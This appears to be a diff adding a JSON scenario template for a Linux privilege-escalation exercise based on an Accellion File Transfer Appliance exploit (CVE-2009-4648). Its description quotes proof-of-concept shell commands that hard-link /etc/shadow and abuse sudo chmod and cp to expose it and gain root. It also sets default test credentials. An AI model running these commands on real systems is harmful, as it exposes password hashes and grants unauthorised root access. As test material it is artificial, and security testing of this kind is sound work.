@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_33623",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: Accellion Secure File Transfer Appliance - Multiple Command Restriction / Privilege Escalations (CVE-2009-4648;OSVDB-62522)\n\nExploit source code (33623.txt):\n```\nsource: https://www.securityfocus.com/bid/38176/info\n\nAccellion File Transfer Appliance is prone to multiple remote vulnerabilities, including:\n\n- Multiple privilege-escalation issues\n- A directory-traversal issue\n- An HTML-injection issue\n- A remote command-injection issue\n\nAn attacker may leverage these issues to execute arbitrary script code within the context of the webserver, steal cookie-based authentication credentials, obtain sensitive information, and execute arbitrary code or commands with superuser privileges. Other attacks are also possible.\n\nThe following proofs of concept are available:\n\nsh-2.05b$ ln /etc/shadow /home/admin/oldtemp\nsh-2.05b$ sudo /bin/chmod 666 /home/admin/oldtemp\n\nsh-2.05b$ ln /etc/shadow /home/admin/temp\nsh-2.05b$ sudo /bin/cp /home/admin/temp /etc/mail/sendmail.cf\n\nsh-2.05b$ sudo /usr/local/bin/admin.pl\n```",
+  "cve": "CVE-2009-4648;OSVDB-62522",
+  "exploitdb_id": "33623",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_33623",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
